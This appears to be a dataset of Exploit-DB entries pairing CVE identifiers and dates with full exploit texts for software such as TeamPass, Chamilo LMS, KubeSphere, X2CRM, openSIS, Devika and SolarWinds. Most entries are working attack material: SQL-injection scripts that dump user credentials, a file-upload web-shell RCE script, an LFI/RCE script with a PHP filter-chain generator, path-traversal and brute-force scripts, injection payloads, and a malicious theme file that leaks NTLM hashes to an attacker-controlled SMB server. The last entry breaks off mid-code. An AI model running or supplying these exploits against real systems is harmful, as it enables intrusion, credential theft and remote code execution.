CVE-2024-46528,2025-03-27,exploit db,"# Exploit Title: KubeSphere 3.4.0 - Insecure Direct Object Reference (IDOR) # Date: 3 September # Exploit Author: Okan Kurtulus # Vendor Homepage: https://kubesphere.io # Software Link: https://github.com/kubesphere/kubesphere # Version: [>= 4.0.0 & < 4.1.3] , [>= 3.0.0 & < 3.4.1] # Tested on: Ubuntu 22.04 # CVE : CVE-2024-46528 1-) Log in to the system with a user who is not registered to any workspace (e.g., a ""platform-regular"" user who has limited authorization). Note: The authorization level of this user is as follows: ""Cannot access any resources before joining a workspace."" 2-) After logging in with this user, it has been observed that cluster information, node information, users registered in the system, and other similar areas can be accessed without the user being registered to any workspace or cluster. Examples of accessible endpoints: http://xxx.xxx.xx.xx:30880/clusters/default/overview http://xxx.xxx.xx.xx:30880/clusters/default/nodes http://xxx.xxx.xx.xx:30880/access/accounts http://xxx.xxx.xx.xx:30880/clusters/default/monitor-cluster/ranking http://xxx.xxx.xx.xx:3 0880/clusters/default/monitor-cluster/resource http://xxx.xxx.xx.xx:30880/clusters/default/projects http://xxx.xxx.xx.xx:30880/clusters/default/nodes/minikube/pods http://xxx.xxx.xx.xx:30880/clusters/default/kubeConfig"
CVE-2024-48120,2025-03-27,exploit db,"# Exploit Title: X2CRM 8.5 - Stored Cross-Site Scripting (XSS) # Date: 12 September 2024 # Exploit Author: Okan Kurtulus # Vendor Homepage: https://x2engine.com/ # Software Link: https://github.com/X2Engine/X2CRM # Version: X2CRM v8.5 # Tested on: Ubuntu 22.04 # CVE : CVE-2024-48120 1-) Log in to the system with any user account. Navigate to the “Opportunities” section from the top menu and select “Create List.” In the “Name” field of the new screen, enter the malicious XSS payload and click “Create.” 2-) Next, return to the “Opportunities” tab and click on “Lists” again. The stored XSS payload will be triggered. XSS Trigger Request: POST /x2crm/x2engine/index.php/opportunities/createList HTTP/1.1 Host: 192.168.1.108 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 390 Origin: http://192.168.1.108 Connection: keep-alive Referer: http://192.168.1.108/x2crm/x2engine/index.php/opportunities/createList Cookie: PHPSESSID=uijrtnp42qqo29vfkb4v0sps3i; YII_CSRF_TOKEN=Rkw1SWxTc1dpa0Z0OGdpb1RxY0ZGVDY5X3pPMzVFTDGjgT_kJmGLFkvRCi_Y9OO4f0QIHNTvqbSw1t9UVVXL4g%3D%3D; 5d8630d289284e8c14d15b14f4b4dc28=9d5b82f1240eb47cd73a20df560d9b3086847e33a%3A4%3A%7Bi%3A0%3Bs%3A1%3A%223%22%3Bi%3A1%3Bs%3A4%3A%22test%22%3Bi%3A2%3Bi%3A2592000%3Bi%3A3%3Ba%3A0%3A%7B%7D%7D; LoginForm[username]=test; LoginForm[rememberMe]=1 Upgrade-Insecure-Requests: 1 Priority: u=0, i YII_CSRF_TOKEN=Rkw1SWxTc1dpa0Z0OGdpb1RxY0ZGVDY5X3pPMzVFTDGjgT_kJmGLFkvRCi_Y9OO4f0QIHNTvqbSw1t9UVVXL4g%3D%3D&X2List%5Bname%5D=%3Cscript%3Ealert%282%29%3B%3C%2Fscript%3E&X2List%5Btype%5D=dynamic&X2List%5BassignedTo%5D=test2&X2List%5Bvisibility%5D=1&X2List%5BlogicType%5D=AND&X2List%5Battribute%5D%5B%5D=alternativeEmail&X2List%5Bcomparison%5D%5B%5D=%3D&X2List%5Bvalue%5D%5B%5D=test&yt0=Create"
CVE-2024-0132,2025-03-26,exploit db,"# Exploit Title: Container Breakout with NVIDIA Container Toolkit # Date: 17/02/2025 # Exploit Author: r0binak #Software Link Homepage: https://github.com/NVIDIA/nvidia-container-toolkit # Version: 1.16.1 # Tested on: NVIDIA Container Tooklit 1.16.1 # CVE: CVE-2024-0132 Description: NVIDIA Container Toolkit 1.16.1 or earlier contains a Time-of-check Time-of-Use (TOCTOU) vulnerability when used with default configuration where a specifically crafted container image may gain access to the host file system. This does not impact use cases where CDI is used. A successful exploit of this vulnerability may lead to code execution, denial of service, escalation of privileges, information disclosure, and data tampering."
CVE-2024-21320,2025-03-22,exploit db,"# Exploit Title: CVE-2024-21320 - NTLM Hash Leak via Malicious Windows Theme # Date: 02/03/2025 # Exploit Author: Abinesh Kamal K U # CVE : CVE-2024-21320 # Ref: https://www.cve.org/CVERecord?id=CVE-2024-21320 ## Step 1: Install Responder Responder is a tool to capture NTLM hashes over SMB. git clone https://github.com/lgandx/Responder.git cd Responder Replace `eth0` with your network interface. ## Step 2: Create a Malicious Windows Theme File ### Python Script to Generate the Malicious `.theme` File import os # Attacker-controlled SMB server IP attacker_smb_server = ""192.168.1.100"" # Change this to your attacker's IP # Name of the malicious theme file theme_filename = ""malicious.theme"" # Malicious .theme file content theme_content = f"""""" [Theme] DisplayName=Security Update Theme [Control Panel\Desktop] Wallpaper=\\\\{attacker_smb_server}\\share\\malicious.jpg [VisualStyles] Path=%SystemRoot%\\resources\\Themes\\Aero\\Aero.msstyles ColorStyle=NormalColor Size=NormalSize # Write the theme file with open(theme_filename, ""w"") as theme_file: theme_file.write(theme_content) print(f""[+] Malicious theme file '{theme_filename}' created."") # Optional: Start a Python HTTP server to serve the malicious theme file start_http = input(""Start HTTP server to deliver theme file? (y/n): "").strip().lower() if start_http == ""y"": print(""[+] Starting HTTP server on port 8080..."") os.system(""python3 -m http.server 8080"") ## Step 3: Deliver & Capture NTLM Hashes 1. Send the `malicious.theme` file to the target. 2. Run Responder to capture the NTLM hash: sudo python3 Responder.py -I eth0 3. Wait for the victim to open the `.theme` file. 4. Extract NTLM hash from Responder logs and crack it using hashcat: hashcat -m 5600 captured_hashes.txt rockyou.txt Abinesh Kamal K U abineshjerry.info MTech - Cyber Security Systems & Networks Amrita University"
CVE-2023-1545,2025-03-22,exploit db,"# Exploit Title: TeamPass SQL Injection # Google Dork: intitle:""Teampass"" + inurl:index.php?page=items # Date: 02/23/2025 # Exploit Author: Max Meyer - Rivendell # Vendor Homepage: http://www.teampass.net # Software Link: https://github.com/nilsteampassnet/TeamPass # Version: 2.1.24 and prior # Tested on: Windows/Linux # CVE : CVE-2023-1545 #!/usr/bin/env python3 import sys import json import base64 import logging import requests from typing import Optional, Dict, Any from dataclasses import dataclass # Configuração de logging logging.basicConfig( level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s' logger = logging.getLogger(__name__) @dataclass class TeamPassExploit: base_url: str arbitrary_hash: str = '$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq' def __post_init__(self): self.vulnerable_url = f""{self.base_url}/api/index.php/authorize"" def check_api_enabled(self) -> bool: """"""Verifica se a API está habilitada."""""" try: response = requests.get(self.vulnerable_url) if ""API usage is not allowed"" in response.text: logger.error(""API feature is not enabled"") return False return True except requests.RequestException as e: logger.error(f""Erro ao verificar API: {e}"") return False def execute_sql(self, sql_query: str) -> Optional[str]: """"""Executa uma query SQL através da vulnerabilidade."""""" try: inject = f""none' UNION SELECT id, '{self.arbitrary_hash}', ({sql_query}), private_key, "" \ ""personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' "" \ ""FROM teampass_users WHERE login='admin"" data = { ""login"": inject, ""password"": ""h4ck3d"", ""apikey"": ""foo"" response = requests.post( self.vulnerable_url, headers={""Content-Type"": ""application/json""}, json=data if not response.ok: logger.error(f""Erro na requisição: {response.status_code}"") return None token = response.json().get('token') if not token: logger.error(""Token não encontrado na resposta"") return None # Decodifica o token JWT token_parts = token.split('.') if len(token_parts) < 2: logger.error(""Token JWT inválido"") return None payload = base64.b64decode(token_parts[1] + '=' * (-len(token_parts[1]) % 4)) return json.loads(payload).get('public_key') except Exception as e: logger.error(f""Erro ao executar SQL: {e}"") return None def get_user_credentials(self) -> Optional[Dict[str, str]]: """"""Obtém credenciais de todos os usuários."""""" try: # Obtém número total de usuários user_count = self.execute_sql(""SELECT COUNT(*) FROM teampass_users WHERE pw != ''"") if not user_count or not user_count.isdigit(): logger.error(""Não foi possível obter o número de usuários"") return None user_count = int(user_count) logger.info(f""Encontrados {user_count} usuários no sistema"") credentials = {} for i in range(user_count): username = self.execute_sql( f""SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT {i},1"" password = self.execute_sql( f""SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT {i},1"" if username and password: credentials[username] = password logger.info(f""Credenciais obtidas para: {username}"") return credentials except Exception as e: logger.error(f""Erro ao obter credenciais: {e}"") return None def main(): if len(sys.argv) < 2: logger.error(""Usage: python3 script.py "") sys.exit(1) exploit = TeamPassExploit(sys.argv[1]) if not exploit.check_api_enabled(): sys.exit(1) credentials = exploit.get_user_credentials() if credentials: print(""\nCredenciais encontradas:"") for username, password in credentials.items(): print(f""{username}: {password}"") if __name__ == ""__main__"": main()"
CVE-2025-2126,2025-03-20,exploit db,"# Exploit Title: JUX Real Estate 3.4.0 - SQL Injection # Exploit Author: CraCkEr # Date: 26/02/2025 # Vendor: JoomlaUX # Vendor Homepage: https://joomlaux.com/ # Software Link: https://extensions.joomla.org/extension/jux-real-estate/ # Demo Link: http://demo.joomlaux.com/#jux-real-estate # Tested on: Windows 11 Pro # Impact: Database Access # CWE: CWE-89 - CWE-74 - CWE-707 # CVE: CVE-2025-2126 # VDB: VDB-299039 ## Description SQL injection attacks can allow unauthorized access to sensitive data, modification of data and crash the application or make it unavailable, leading to lost revenue and damage to a company's reputation. Path: /extensions/realestate/index.php/properties/list/list-with-sidebar/realties GET Parameter 'title' is vulnerable to SQLi Parameter: title (GET) Type: time-based blind Title: MySQL >= 5.0.12 time-based blind (query SLEEP) Payload: option=com_jux_real_estate&view=realties&Itemid=148&title='XOR(SELECT(0)FROM(SELECT(SLEEP(6)))a)XOR'Z&price_slider_lower=63752&price_slider_upper=400000&area_slider_lower=30&area_slider_upper=400&type_id=2&cat_id=8&country_id=73&locstate=187&beds=1&agent_id=112&baths=1&jp_yearbuilt=&button=Search"
CVE-2023-0159,2025-03-19,exploit db,"# Exploit Title: Extensive VC Addons for WPBakery page builder < 1.9.1 - Unauthenticated RCE # Date: 12 march 2025 # Exploit Author: Ravina # Vendor Homepage: wprealize # Version: 1.9.1 # Tested on: windows, linux # CVE ID : CVE-2023-0159 # Vulnerability Type: Remote Code Execution # CVE-2023-0159_scan.py #!/usr/bin/env python3 # LFI: ./exploit.py --mode lfi --target https://vuln-site.com --file /etc/passwd # RCE: ./exploit.py --mode rce --target https://vuln-site.com --command ""id"" --generator /path/to/php_filter_chain_generator.py import argparse import requests import base64 import subprocess import time import php_filter_chain_generator def run_lfi(target, file_path): url = f""{target}/wp-admin/admin-ajax.php"" payload = { 'action': 'extensive_vc_init_shortcode_pagination', 'options[template]': f'php://filter/convert.base64-encode/resource={file_path}' try: response = requests.post(url, data=payload) if response.status_code == 200 and '{""status"":""success"",""message"":""Items are loaded"",""data"":' in response.text: try: json_data = response.json() base64_content = json_data['data']['items'] decoded = base64.b64decode(base64_content).decode() print(f""\n[+] Successfully read {file_path}:\n"") print(decoded) except Exception as e: print(f""[-] Decoding failed: {str(e)}"") print(f""Raw response (truncated): {response.text[:500]}..."") else: print(f""[-] LFI failed (Status: {response.status_code})"") except Exception as e: print(f""[-] Request failed: {str(e)}"") def run_rce(target, command, generator_path): # Base64 encode command to handle special characters encoded_cmd = base64.b64encode(command.encode()).decode() php_code = f' ' # Generate filter chain try: result = subprocess.run( [generator_path, '--chain', php_code], capture_output=True, text=True, check=True payload = None for line in result.stdout.split('\n'): if line.startswith('php://filter'): payload = line.strip() break if not payload: print(""[-] Failed to generate payload"") return url = f""{target}/wp-admin/admin-ajax.php"" data = {'action': 'extensive_vc_init_shortcode_pagination', 'options[template]': payload} print(f""[*] Sending payload for command: {command}"") start_time = time.time() # Send the request to attempt RCE and dont forget to pass the generator path response = requests.post(url, data=data) elapsed = time.time() - start_time print(f""\n[+] Response time: {elapsed:.2f} seconds"") print(f""[+] Status code: {response.status_code}"") if response.status_code == 200: print(""\n[+] Response content:"") print(response.text[:1000] + (""..."" if len(response.text) > 1000 else """")) except subprocess.CalledProcessError as e: print(f""[-] Filter chain generator failed: {e.stderr}"") except FileNotFoundError: print(f""[-] Generator not found at {generator_path}"") except Exception as e: print(f""[-] RCE failed: {str(e)}"") def main(): parser = argparse.ArgumentParser(description=""CVE-2023-0159 Exploit Script"") parser.add_argument(""--mode"", choices=[""lfi"", ""rce""], required=True, help=""Exploit mode"") parser.add_argument(""--target"", required=True, help=""Target URL (e.g., https://example.com)"") parser.add_argument(""--file"", help=""File path for LFI mode"") parser.add_argument(""--command"", help=""Command to execute for RCE mode"") parser.add_argument(""--generator"", default=""php_filter_chain_generator.py"", help=""Path to php_filter_chain_generator.py"") args = parser.parse_args() if args.mode == ""lfi"": if not args.file: print(""[-] Missing --file argument for LFI mode"") return run_lfi(args.target.rstrip('/'), args.file) elif args.mode == ""rce"": if not args.command: print(""[-] Missing --command argument for RCE mode"") return run_rce(args.target.rstrip('/'), args.command, args.generator) if __name__ == ""__main__"": main() # php_filter_chain_generator.py #!/usr/bin/env python3 import argparse import base64 import re # No need to guess a valid filename anymore file_to_use = ""php://temp"" conversions = { '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2', '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4', '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921', '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE', '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE', '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2', '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2', '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4', '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2', '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB', 'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213', 'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE', 'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000', 'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE', 'C': 'convert.iconv.UTF8.CSISO2022KR', 'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2', 'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213', 'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5', 'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT', 'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937', 'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB', 'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213', 'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8', 'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90', 'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213', 'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE', 'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213', 'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000', 'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4', 'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16', 'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE', 'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2', 'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC', 'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE', 'M':'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T', 'm':'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949', 'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4', 'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61', 'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775', 'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE', 'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB', 'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4', 'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2', 'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2', 'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4', 'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101', 'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS', 's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90', 'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103', 't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS', 'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943', 'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61', 'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB', 'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2', 'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936', 'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE', 'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932', 'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS', 'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361', 'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT', 'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16', 'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937', '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4', '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157', def generate_filter_chain(chain, debug_base64 = False): encoded_chain = chain # generate some garbage base64 filters = ""convert.iconv.UTF8.CSISO2022KR|"" filters += ""convert.base64-encode|"" # make sure to get rid of any equal signs in both the string we just generated and the rest of the file filters += ""convert.iconv.UTF8.UTF7|"" for c in encoded_chain[::-1]: filters += conversions[c] + ""|"" # decode and reencode to get rid of everything that isn't valid base64 filters += ""convert.base64-decode|"" filters += ""convert.base64-encode|"" # get rid of equal signs filters += ""convert.iconv.UTF8.UTF7|"" if not debug_base64: # don't add the decode while debugging chains filters += ""convert.base64-decode"" final_payload = f""php://filter/{filters}/resource={file_to_use}"" return final_payload def main(): # Parsing command line arguments parser = argparse.ArgumentParser(description=""PHP filter chain generator."") parser.add_argument(""--chain"", help=""Content you want to generate. (you will maybe need to pad with spaces for your payload to work)"", required=False) parser.add_argument(""--rawbase64"", help=""The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug."", required=False) args = parser.parse_args() if args.chain is not None: chain = args.chain.encode('utf-8') base64_value = base64.b64encode(chain).decode('utf-8').replace(""="", """") chain = generate_filter_chain(base64_value) print(""[+] The following gadget chain will generate the following code : {} (base64 value: {})"".format(args.chain, base64_value)) print(chain) if args.rawbase64 is not None: rawbase64 = args.rawbase64.replace(""="", """") match = re.search(""^([A-Za-z0-9+/])*$"", rawbase64) if (match): chain = generate_filter_chain(rawbase64, True) print(chain) else: print (""[-] Base64 string required."") exit(1) if __name__ == ""__main__"": main()"
CVE-2023-4220,2025-03-18,exploit db,"# Exploit Title: Chamilo LMS 1.11.24 - Remote Code Execution (RCE) # Exploit Author: 0x00-null - Mohamed Kamel BOUZEKRIA # Exploit Date: September 3, 2024 # Vendor Homepage: https://chamilo.org/ # Software Link: https://chamilo.org/ # Version: 1.11.24 (Beersel) # Tested Versions: 1.11.24 (Beersel) - August 31, 2023 # CVE ID: CVE-2023-4220 # Vulnerability Type: Remote Code Execution # Description: Unauthenticated remote code execution in Chamilo LMS <= 1.11.24 due to an unrestricted file upload vulnerability. # Proof of Concept: Yes # Categories: Web Application, Remote Code Execution, File Upload # CVSS Score: 8.1 (High) # CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H # Notes: Ensure that the /main/inc/lib/javascript/bigupload/files/ directory exists and is writable. # License: MIT License # References: # - CVE Details: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4220 # - Exploit Documentation: https://github.com/0x00-null/Chamilo-CVE-2023-4220-RCE-Exploit # - Vendor Advisory: https://chamilo.org/ import requests import argparse from urllib.parse import urljoin def upload_shell(target_url, payload_name): upload_url = urljoin(target_url, ""main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"") shell_path = f""/main/inc/lib/javascript/bigupload/files/{payload_name}"" shell_url = urljoin(target_url, shell_path) # Payload containing the PHP web shell files = {'bigUploadFile': (payload_name, ' ', 'application/x-php')} # Upload the payload response = requests.post(upload_url, files=files) if response.status_code == 200: print(""[+] File uploaded successfully!"") print(f""[+] Access the shell at: {shell_url}?cmd="") else: print(""[-] File upload failed."") def execute_command(shell_url, cmd): # Execute the command response = requests.get(f""{shell_url}?cmd={cmd}"") if response.status_code == 200: print(f""[+] Command Output:\n{response.text}"") else: print(f""[-] Failed to execute command at {shell_url}"") if __name__ == ""__main__"": # Parse command-line arguments parser = argparse.ArgumentParser(description=""CVE-2023-4220 Chamilo LMS Unauthenticated File Upload RCE Exploit"") parser.add_argument('target_url', help=""The target base URL of the Chamilo LMS instance (e.g., http://example.com/)"") parser.add_argument('cmd', help=""The command to execute on the remote server"") parser.add_argument('--shell', default='rce.php', help=""The name of the shell file to be uploaded (default: rce.php)"") args = parser.parse_args() # Run the exploit with the provided arguments upload_shell(args.target_url, args.shell) # Form the shell URL to execute commands shell_url = urljoin(args.target_url, f""main/inc/lib/javascript/bigupload/files/{args.shell}"") execute_command(shell_url, args.cmd)"
CVE-2024-46626,2024-10-01,exploit db,"# Exploit Title: openSIS 9.1 - SQLi (Authenticated) # Google Dork: intext:""openSIS is a product"" # Date: 09.09.2024 # Exploit Author: Devrim Dıragumandan (d0ub1edd) # Vendor Homepage: https://www.os4ed.com/ # Software Link: https://github.com/OS4ED/openSIS-Classic/releases/tag/V9.1 # Version: 9.1 # Tested on: Linux A SQL injection vulnerability exists in OS4Ed Open Source Information System Community v9.1 via the ""X-Forwarded-For"" header parameters in POST request sent to /Ajax.php. GET /Ajax.php?modname=x HTTP/1.1 Parameter: X-Forwarded-For #1* ((custom) HEADER) Type: boolean-based blind Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE) Payload: 127.0.0.2' AND EXTRACTVALUE(5785,CASE WHEN (5785=5785) THEN 5785 ELSE 0x3A END) AND 'HVwG'='HVwG Type: error-based Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET) Payload: 127.0.0.2' AND GTID_SUBSET(CONCAT(0x717a787671,(SELECT (ELT(5261=5261,1))),0x71716b6b71),5261) AND 'djze'='djze Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) Payload: 127.0.0.2' AND (SELECT 5313 FROM (SELECT(SLEEP(5)))VeyP) AND 'ZIae'='ZIae FIX: https://github.com/OS4ED/openSIS-Classic/pull/322"
CVE-2024-40422,2024-08-04,exploit db,"# Exploit Title: Devika v1 - Path Traversal via 'snapshot_path' Parameter # Google Dork: N/A # Date: 2024-06-29 # Exploit Author: Alperen Ergel # Contact: @alpernae (IG/X) # Vendor Homepage: https://devikaai.co/ # Software Link: https://github.com/stitionai/devika # Version: v1 # Tested on: Windows 11 Home Edition # CVE: CVE-2024-40422 #!/usr/bin/python import argparse import requests def exploit(target_url): url = f'http://{target_url}/api/get-browser-snapshot' params = { 'snapshot_path': '../../../../etc/passwd' response = requests.get(url, params=params) print(response.text) if __name__ == ""__main__"": parser = argparse.ArgumentParser(description='Exploit directory traversal vulnerability.') parser.add_argument('-t', '--target', help='Target URL (e.g., target.com)', required=True) args = parser.parse_args() exploit(args.target)"
CVE-2024-28999,2024-06-26,exploit db,"# Exploit Title: SolarWinds Platform 2024.1 SR1 - Race Condition # CVE: CVE-2024-28999 # Affected Versions: SolarWinds Platform 2024.1 SR 1 and previous versions # Author: Elhussain Fathy, AKA 0xSphinx import requests import urllib3 import asyncio import aiohttp urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) http = urllib3.PoolManager(cert_reqs='CERT_REQUIRED') # host = '192.168.1.1' # username = ""admin"" # file_path = ""passwords.txt"" host = input(""Enter the host: "") username = input(""Enter the username: "") file_path = input(""Enter the passwords file path: "") exploited = 0 url = f""https://{host}:443/Orion/Login.aspx?ReturnUrl=%2F"" passwords = [] with open(file_path, 'r') as file: for line in file: word = line.strip() passwords.append(word) print(f""Number of tested passwords: {len(passwords)}"") headers = { 'Host': host, sessions = [] for _ in range(len(passwords)): response = requests.get(url, headers=headers, verify=False, stream=False) cookies = response.headers.get('Set-Cookie', '') session_id = cookies.split('ASP.NET_SessionId=')[1].split(';')[0] sessions.append(session_id) async def send_request(session, username, password): headers = { 'Host': host, 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Cookie': f'ASP.NET_SessionId={session}; TestCookieSupport=Supported; Orion_IsSessionExp=TRUE', data = f'__EVENTTARGET=ctl00%24BodyContent%24LoginButton&__EVENTARGUMENT=&__VIEWSTATE=AEQKNijmHeR5jZhMrrXSjzPRqhTz%2BoTqkfNmc3EcMLtc%2FIjqS37FtvDMFn83yUTgHBJIlMRHwO0UVUVzwcg2cO%2B%2Fo2CEYGVzjB1Ume1UkrvCOFyR08HjFGUJOR4q9GX0fmhVTsvXxy7A2hH64m5FBZTL9dfXDZnQ1gUvFp%2BleWgLTRssEtTuAqQQxOLA3nQ6n9Yx%2FL4QDSnEfB3b%2FlSWw8Xruui0YR5kuN%2BjoOH%2BEC%2B4wfZ1%2BCwYOs%2BLmIMjrK9TDFNcWTUg6HHiAn%2By%2B5wWpsj7qiJG3%2F1uhWb8fFc8Mik%3D&__VIEWSTATEGENERATOR=01070692&ctl00%24BodyContent%24Username={username}&ctl00%24BodyContent%24Password={password}' async with aiohttp.ClientSession() as session: async with session.post(url, 